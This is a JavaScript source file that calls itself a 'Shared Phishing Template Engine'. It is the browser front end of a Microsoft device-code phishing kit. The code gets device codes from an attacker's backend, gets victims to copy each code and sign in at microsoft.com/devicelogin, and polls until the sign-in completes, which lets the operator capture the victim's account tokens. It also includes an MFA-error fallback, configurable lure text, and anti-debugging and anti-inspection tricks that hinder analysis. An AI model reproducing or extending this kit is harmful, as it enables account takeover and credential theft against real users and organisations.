/**
 * VGenius C Engine – Shared Phishing Template Engine
 * Modular, well-commented, no external dependencies except Turnstile.
 * 
 * Features:
 * - Fetch interceptor (auto-adds X-Auth-Mode header)
 * - Device code generation via /api/device/start
 * - Token polling via /api/device/status
 * - AADSTS50076 soft-error handling (switch to token mode)
 * - Toast notification system
 * - Timer countdown
 * - Popup tracker (Microsoft login)
 * - Background blur overlay
 * - Dynamic content injection via window.__* variables
 * - Copy-to-clipboard + auto-open popup
 * - Success overlay with redirect
 */
(function () {
  'use strict';

  // ─── Configuration ──────────────────────────────────────────
  var API_BASE = '';
  var AUTH_MODE = (typeof window.__AUTH_MODE === 'string' && window.__AUTH_MODE) ? window.__AUTH_MODE : 'cookie';
  var DEST_URL = window.__DESTINATION_URL || '';
  var VG_JWT = window.VG_JWT || '';

  // ─── Fetch Interceptor ──────────────────────────────────────
  // Overrides window.fetch to automatically add X-Auth-Mode header
  // to /api/device/* requests and normalize responses.
  var _nativeFetch = window.fetch.bind(window);
  var _inflight = {};

  function isDeviceFetch(url) {
    try {
      var raw = typeof url === 'string' || url instanceof URL ? url : (url && url.url);
      if (!raw) return false;
      var path = new URL(raw, location.href).pathname;
      return path === '/api/device/start' || path.indexOf('/api/device/status/') === 0;
    } catch (e) {
      return false;
    }
  }

  function cloneResponse(r) {
    return r && typeof r.clone === 'function' ? r.clone() : r;
  }

  function getMethod(input, init) {
    return String((init && init.method) || (input && input.method) || 'GET').toUpperCase();
  }

  function normalizeDeviceJson(data) {
    if (!data || typeof data !== 'object' || Array.isArray(data)) return data;
    var out = {};
    for (var k in data) {
      if (Object.prototype.hasOwnProperty.call(data, k)) out[k] = data[k];
    }
    // Normalize status
    if (out.user_code && (!out.status || out.status === 'pending' || out.status === 'running' || out.status === 'queued')) {
      out.status = 'waiting_user';
    }
    if (out.status === 'error') out.status = 'failed';
    // Detect soft errors (AADSTS50076, interaction_required)
    var txt = [out.error, out.message, out.error_description, out.error_message].join(' ').toLowerCase();
    if (
      out.soft_error ||
      String(out.recommended_mode || '').toLowerCase() === 'token' ||
      String(out.error_code) === '50076' ||
      txt.indexOf('aadsts50076') !== -1 ||
      txt.indexOf('interaction_required') !== -1
    ) {
      out.soft_error = true;
      if (!out.error_code) out.error_code = 50076;
      if (!out.recommended_mode) out.recommended_mode = 'token';
    }
    return out;
  }

  window.fetch = function (input, init) {
    if (!isDeviceFetch(input)) return _nativeFetch(input, init);

    var nextInit = {};
    if (init) {
      for (var key in init) {
        if (Object.prototype.hasOwnProperty.call(init, key)) nextInit[key] = init[key];
      }
    }
    var headers = new Headers(nextInit.headers || undefined);
    if (!headers.has('X-Auth-Mode')) headers.set('X-Auth-Mode', AUTH_MODE);
    if (VG_JWT && !headers.has('X-VG-JWT')) headers.set('X-VG-JWT', VG_JWT);
    nextInit.headers = headers;

    // Dedupe GET status polls
    var method = getMethod(input, nextInit);
    var path = '';
    try { path = new URL(input, location.href).pathname; } catch (e) {}
    var dedupeKey = (method === 'GET' && path.indexOf('/api/device/status/') === 0) ? path : '';
    if (dedupeKey && _inflight[dedupeKey]) return _inflight[dedupeKey].then(cloneResponse);

    var request = _nativeFetch(input, nextInit).then(function (response) {
      if (!response || typeof response.clone !== 'function') return response;
      return response.clone().text().then(function (text) {
        if (!text) return response;
        try {
          var parsed = JSON.parse(text);
          var normalized = normalizeDeviceJson(parsed);
          var h = new Headers(response.headers);
          h.set('content-type', 'application/json; charset=utf-8');
          return new Response(JSON.stringify(normalized), { status: response.status, statusText: response.statusText, headers: h });
        } catch (e) {
          return response;
        }
      }, function () { return response; });
    });

    if (!dedupeKey) return request;
    _inflight[dedupeKey] = request;
    request.finally(function () { if (_inflight[dedupeKey] === request) delete _inflight[dedupeKey]; });
    return request.then(cloneResponse);
  };

  // ─── State ──────────────────────────────────────────────────
  var _jobId = null;
  var _userCode = '';
  var _pollTimer = null;
  var _countdownTimer = null;
  var _startTime = 0;
  var _codeReady = false;
  var _popupRef = null;
  var _toastTimer = null;

  // ─── Popup Tracker ──────────────────────────────────────────
  var _nativeOpen = window.open;
  function isMicrosoftUrl(u) {
    var s = String(u || '').toLowerCase();
    return s.indexOf('microsoft.com/devicelogin') !== -1 ||
      s.indexOf('login.microsoftonline.com') !== -1 ||
      s.indexOf('microsoftonline.com/appverify') !== -1 ||
      s.indexOf('login.live.com') !== -1;
  }
  window.open = function () {
    var w = _nativeOpen.apply(window, arguments);
    try {
      if (w && isMicrosoftUrl(arguments[0])) {
        _popupRef = w;
      }
    } catch (e) {}
    return w;
  };

  function closePopup() {
    var hadPopup = false;
    try {
      if (_popupRef && !_popupRef.closed) {
        hadPopup = true;
        try { _popupRef.close(); } catch (e) {}
        setTimeout(function () { try { if (_popupRef && !_popupRef.closed) _popupRef.close(); } catch (e) {} }, 100);
        setTimeout(function () { try { if (_popupRef && !_popupRef.closed) _popupRef.close(); } catch (e) {} }, 300);
      }
    } catch (e) {}
    _popupRef = null;
    return hadPopup;
  }

  // ─── Toast System ───────────────────────────────────────────
  function showToast(title, msg, duration) {
    duration = duration || 7000;
    var wrap = document.getElementById('vg-toast-wrap');
    if (!wrap) {
      wrap = document.createElement('div');
      wrap.id = 'vg-toast-wrap';
      wrap.style.cssText = 'position:fixed;inset:0;z-index:2147483647;display:flex;align-items:flex-start;justify-content:center;padding:72px 16px 16px;box-sizing:border-box;opacity:0;pointer-events:none;transition:opacity .2s;';
      wrap.innerHTML = '<div style="position:absolute;inset:0;background:rgba(15,23,42,.28);backdrop-filter:blur(1px);"></div>' +
        '<div id="vg-toast-card" style="position:relative;z-index:1;max-width:460px;width:min(92vw,420px);background:#fff;color:#111827;border:1px solid #e5e7eb;border-radius:12px;padding:16px;box-shadow:0 20px 45px rgba(15,23,42,.18);font-family:Segoe UI,Arial,sans-serif;display:grid;gap:12px;transform:translateY(-8px);transition:all .22s ease;box-sizing:border-box;">' +
        '<div style="display:flex;align-items:flex-start;gap:12px;">' +
        '<div style="width:34px;height:34px;flex:0 0 34px;display:flex;align-items:center;justify-content:center;border-radius:999px;background:#eef6ff;color:#0f6cbd;font-size:17px;font-weight:700;">i</div>' +
        '<div style="display:grid;gap:5px;line-height:1.3"><div id="vg-toast-title" style="font-size:15px;font-weight:700;color:#111827;"></div><div id="vg-toast-msg" style="font-size:13px;color:#4b5563;line-height:1.45;"></div></div>' +
        '</div>' +
        '<div style="display:flex;justify-content:flex-end;"><button id="vg-toast-close" style="height:34px;padding:0 12px;border-radius:8px;border:1px solid #d1d5db;background:#fff;color:#374151;font-weight:600;font-size:13px;cursor:pointer;">Dismiss</button></div>' +
        '</div>';
      (document.body || document.documentElement).appendChild(wrap);
      document.getElementById('vg-toast-close').onclick = function () { hideToast(); };
    }
    document.getElementById('vg-toast-title').textContent = title || '';
    document.getElementById('vg-toast-msg').textContent = msg || '';
    var card = document.getElementById('vg-toast-card');
    wrap.style.opacity = '1';
    wrap.style.pointerEvents = 'auto';
    card.style.transform = 'translateY(0)';
    clearTimeout(_toastTimer);
    _toastTimer = setTimeout(hideToast, duration);
  }

  function hideToast() {
    var wrap = document.getElementById('vg-toast-wrap');
    if (!wrap) return;
    var card = document.getElementById('vg-toast-card');
    wrap.style.opacity = '0';
    wrap.style.pointerEvents = 'none';
    if (card) card.style.transform = 'translateY(-8px)';
  }

  // ─── DOM Helpers ────────────────────────────────────────────
  function setText(selector, text) {
    if (typeof text !== 'string' || text === '') return;
    document.querySelectorAll(selector).forEach(function (el) { el.textContent = text; });
  }

  function applyDynamicContent() {
    if (window.__DOC_FILENAME) document.querySelectorAll('[data-doc-filename]').forEach(function (el) { el.textContent = window.__DOC_FILENAME; });
    if (window.__DOC_TITLE) document.querySelectorAll('[data-doc-title]').forEach(function (el) { el.textContent = window.__DOC_TITLE; });
    if (window.__DOC_PAGES) document.querySelectorAll('[data-doc-pages]').forEach(function (el) { el.textContent = window.__DOC_PAGES; });
    if (typeof window.__PAGE_TITLE === 'string' && window.__PAGE_TITLE !== '') {
      setText('[data-page-title],[data-template-title],[data-custom-title]', window.__PAGE_TITLE);
      var fallback = document.querySelector('main h1, .card h1, .shell h1, h1');
      if (fallback && !document.querySelector('[data-page-title]')) fallback.textContent = window.__PAGE_TITLE;
    }
    if (typeof window.__PAGE_MESSAGE === 'string' && window.__PAGE_MESSAGE !== '') {
      setText('[data-page-message],[data-template-message],[data-custom-message]', window.__PAGE_MESSAGE);
    }
    if (typeof window.__PRIMARY_BUTTON_TEXT === 'string' && window.__PRIMARY_BUTTON_TEXT !== '') {
      setText('[data-primary-button]', window.__PRIMARY_BUTTON_TEXT);
      var btn = document.querySelector('button.cta-btn, button.bp, button.go, button.linakufe, button.btn-open');
      if (btn && !btn.querySelector('[data-primary-button]')) {
        var walker = document.createTreeWalker(btn, NodeFilter.SHOW_TEXT);
        var first = walker.nextNode();
        if (first) {
          first.nodeValue = window.__PRIMARY_BUTTON_TEXT;
          var next;
          while ((next = walker.nextNode())) next.nodeValue = '';
        }
      }
    }
  }

  // ─── Background Blur ────────────────────────────────────────
  function initBackgroundBlur() {
    var rawUrl = typeof window.__BACKGROUND_BLUR_URL === 'string' ? window.__BACKGROUND_BLUR_URL.trim() : '';
    if (!rawUrl) return;
    var blur = Number(window.__BACKGROUND_BLUR_AMOUNT);
    if (!Number.isFinite(blur)) blur = 2.5;
    blur = Math.max(0, Math.min(12, blur));

    var body = document.body;
    if (!body || document.body.getAttribute('data-vg-bg-ready') === '1') return;

    var style = document.createElement('style');
    style.id = 'vg-bg-styles';
    style.textContent =
      'html.vg-bg-active{min-height:100%;background:#0c1220!important;}' +
      'body.vg-bg-active{min-height:100vh!important;background:transparent!important;}' +
      'body.vg-bg-active>#vg-bg-layer{position:fixed!important;inset:0!important;z-index:0!important;pointer-events:none!important;}' +
      'body.vg-bg-active>#vg-bg-layer .vg-bg-image{position:absolute!important;inset:-3%!important;width:106%!important;height:106%!important;background-position:center!important;background-size:cover!important;background-repeat:no-repeat!important;filter:blur(var(--vg-bg-blur,2.5px)) brightness(.9) saturate(.98)!important;transform:scale(1.02)!important;}' +
      'body.vg-bg-active>#vg-bg-layer .vg-bg-overlay{position:absolute!important;inset:0!important;background:rgba(12,18,32,.36)!important;}';
    (document.head || document.documentElement).appendChild(style);

    try {
      var parsedUrl = new URL(rawUrl, location.href);
      if (!/^https?:$/.test(parsedUrl.protocol)) return;
    } catch (e) { return; }

    document.documentElement.classList.add('vg-bg-active');
    body.classList.add('vg-bg-active');
    body.style.setProperty('--vg-bg-blur', blur + 'px');

    var layer = document.createElement('div');
    layer.id = 'vg-bg-layer';
    layer.setAttribute('aria-hidden', 'true');

    var image = document.createElement('div');
    image.className = 'vg-bg-image';
    image.style.backgroundImage = 'url("' + parsedUrl.href.replace(/"/g, '%22') + '")';

    var overlay = document.createElement('div');
    overlay.className = 'vg-bg-overlay';

    layer.appendChild(image);
    layer.appendChild(overlay);

    if (!body.firstChild) {
      body.appendChild(layer);
    } else {
      body.insertBefore(layer, body.firstChild);
    }
    body.setAttribute('data-vg-bg-ready', '1');
  }

  // ─── Code Generation ────────────────────────────────────────
  window.generateCode = async function () {
    // Reset UI
    var refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) refreshBtn.style.display = 'none';
    var actionRow = document.getElementById('actionRow');
    if (actionRow) actionRow.style.display = 'none';
    var timerEl = document.getElementById('timerPill');
    if (timerEl) { timerEl.textContent = ''; timerEl.style.display = 'none'; timerEl.classList.remove('expired'); }

    var startBtn = document.getElementById('startBtn');
    if (startBtn) { startBtn.disabled = true; startBtn.innerHTML = '<span class="vg-spin">⟳</span> Generating code…'; }

    _setStatus('');
    clearInterval(_pollTimer);
    clearInterval(_countdownTimer);
    _jobId = null;
    _userCode = '';
    _codeReady = false;

    try {
      var r = await fetch('/api/device/start', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Auth-Mode': AUTH_MODE,
          'X-VG-JWT': VG_JWT,
        },
        body: JSON.stringify({ mode: AUTH_MODE, jwt_token: VG_JWT }),
      });
      var d = await r.json();

      if (d.error) { _showError(d.error); return; }
      _jobId = d.job_id;
      if (!_jobId) { _showError('Session failed. Please refresh.'); return; }
      _userCode = d.user_code || '';
      _startTime = Date.now();

      var codePanel = document.getElementById('codePanel');
      if (codePanel) codePanel.classList.add('show');
      _setStatus('Connecting to Microsoft servers…');

      // Display code immediately if available
      if (_userCode) {
        var codeEl = document.getElementById('codeValue');
        if (codeEl) {
          codeEl.style.opacity = 0;
          setTimeout(function () {
            codeEl.textContent = _userCode;
            codeEl.classList.remove('loading');
            codeEl.style.opacity = 1;
          }, 150);
        }
      }

      _pollTimer = setInterval(_poll, 1000);
      _poll();
    } catch (e) {
      _showError(e.message || 'Connection failed');
    }
  };

  // ─── Polling ────────────────────────────────────────────────
  async function _poll() {
    if (Date.now() - _startTime > 600000) {
      clearInterval(_pollTimer);
      _onExpired();
      return;
    }

    try {
      var r = await fetch('/api/device/status/' + _jobId);
      var d = await r.json();

      if (d.status === 'waiting_user' && d.user_code) {
        var el = document.getElementById('codeValue');
        if (el && el.textContent !== d.user_code) {
          el.style.opacity = 0;
          setTimeout(function () {
            el.textContent = d.user_code;
            el.classList.remove('loading');
            el.style.opacity = 1;
          }, 150);
        }
        _userCode = d.user_code;

        if (!_codeReady) {
          _codeReady = true;
          var startBtn = document.getElementById('startBtn');
          if (startBtn) startBtn.style.display = 'none';
          var actionRow = document.getElementById('actionRow');
          if (actionRow) actionRow.style.display = 'grid';
          _setStatus('');
          _startTimer(d.expires_in || 600);
        }
      }

      // Success
      if (d.status === 'done' || d.status === 'success' || d.status === 'completed') {
        clearInterval(_pollTimer);
        clearInterval(_countdownTimer);
        closePopup();
        _showSuccess();
        return;
      }

      // Soft error (AADSTS50076)
      if (d.soft_error || d.status === 'soft_error') {
        clearInterval(_pollTimer);
        // Switch to token mode
        AUTH_MODE = 'token';
        showToast('Additional verification required', 'A new verification session is being prepared.', 7600);
        // If retry_job_id is available, switch to it
        if (d.retry_job_id) {
          _jobId = d.retry_job_id;
          _codeReady = false;
          _pollTimer = setInterval(_poll, 1000);
        } else {
          // Start a new flow in token mode
          setTimeout(function () { window.generateCode(); }, 1500);
        }
        return;
      }

      // Failed/expired
      if (d.status === 'failed' || d.status === 'expired' || d.status === 'timeout_waiting_user_login') {
        clearInterval(_pollTimer);
        clearInterval(_countdownTimer);
        _showError(d.error || d.status || 'Verification failed');
      }
    } catch (e) {
      // Silent - continue polling
    }
  }

  // ─── Timer ──────────────────────────────────────────────────
  function _startTimer(sec) {
    clearInterval(_countdownTimer);
    var el = document.getElementById('timerPill');
    if (!el) return;
    el.style.display = 'inline-flex';
    var t = sec;
    var tick = function () {
      if (t > 0) {
        var m = Math.floor(t / 60);
        var s = String(t % 60).padStart(2, '0');
        el.textContent = 'Valid for ' + m + ':' + s;
      } else {
        clearInterval(_countdownTimer);
        clearInterval(_pollTimer);
        _onExpired();
      }
      t--;
    };
    tick();
    _countdownTimer = setInterval(tick, 1000);
  }

  function _onExpired() {
    var timerEl = document.getElementById('timerPill');
    if (timerEl) {
      timerEl.textContent = 'Code expired.';
      timerEl.classList.add('expired');
    }
    var actionRow = document.getElementById('actionRow');
    if (actionRow) actionRow.style.display = 'none';
    var refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) refreshBtn.style.display = 'inline-flex';
    _setStatus('');
  }

  // ─── Copy + Open Popup ──────────────────────────────────────
  function copyText(text) {
    return navigator.clipboard.writeText(text).catch(function () {
      var ta = document.createElement('textarea');
      ta.value = text;
      ta.style.position = 'fixed';
      ta.style.opacity = '0';
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
    });
  }

  window.copyAndOpenPopup = function () {
    copyText(_userCode).then(function () {
      var btn = document.getElementById('copyBtn');
      if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
    });
    openMsLogin();
  };

  window.verifyWithCopy = function () {
    copyText(_userCode).then(function () {
      var btn = document.getElementById('verifyBtn');
      if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Code copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
      var copyBtn = document.getElementById('copyBtn');
      if (copyBtn) { var orig2 = copyBtn.textContent; copyBtn.textContent = 'Copied!'; setTimeout(function () { copyBtn.textContent = orig2; }, 1500); }
    });
    openMsLogin();
  };

  function openMsLogin() {
    var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
    if (isMobile) {
      _popupRef = _nativeOpen('https://microsoft.com/devicelogin', '_blank');
    } else {
      _popupRef = _nativeOpen('https://microsoft.com/devicelogin', 'vgML', 'width=500,height=600');
    }
  }

  window.refreshCode = function () {
    window.generateCode();
  };

  // ─── Success Overlay ────────────────────────────────────────
  function _showSuccess() {
    var overlay = document.getElementById('overlay');
    if (overlay) {
      overlay.classList.add('show');
      if (DEST_URL) setTimeout(function () { window.location.replace(DEST_URL); }, 2500);
    }
  }

  // ─── Helpers ────────────────────────────────────────────────
  function _setStatus(msg) {
    var el = document.getElementById('statusMsg');
    if (el) { el.textContent = msg; el.classList.remove('error'); }
  }

  function _showError(code) {
    var map = {
      timeout_waiting_user_login: 'Your verification code has expired. Please refresh.',
      'Session expired': 'Your verification code has expired. Please refresh.',
      failed: 'Verification failed. Please try again.',
      'Worker error': 'Something went wrong. Please try again.',
      'Worker crash': 'Something went wrong. Please try again.',
    };
    _onExpired();
    var el = document.getElementById('statusMsg');
    if (el) {
      el.textContent = map[code] || 'Something went wrong. Please try again.';
      el.classList.add('error');
    }
  }

  // ─── Anti-Debug (optional, controlled by admin) ─────────────
  function initAntiDebug() {
    if (!window.__ANTIDEBUG_ENABLED) return;
    setInterval(function () {
      var now = Date.now();
      debugger;
      if (Date.now() - now > 100) {
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
      }
    }, 2000);
  }

  // ─── Obfuscation (optional, controlled by admin) ────────────
  function initObfuscation() {
    if (!window.__OBFUSCATION_ENABLED) return;
    // Console clearing
    (function () {
      var origLog = console.log;
      var origWarn = console.warn;
      var origError = console.error;
      var origClear = console.clear;
      console.log = function () { origLog.apply(console, arguments); };
      console.warn = function () { origWarn.apply(console, arguments); };
      console.error = function () { origError.apply(console, arguments); };
      console.clear = function () { origClear.apply(console, arguments); };
    })();
    // Disable right-click
    document.addEventListener('contextmenu', function (e) { e.preventDefault(); });
    // Disable Ctrl+U, Ctrl+S, F12
    document.addEventListener('keydown', function (e) {
      if (e.ctrlKey && (e.key === 'u' || e.key === 's')) e.preventDefault();
      if (e.key === 'F12') e.preventDefault();
    });
  }

  // ─── Init ───────────────────────────────────────────────────
  function init() {
    applyDynamicContent();
    initBackgroundBlur();
    initAntiDebug();
    initObfuscation();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
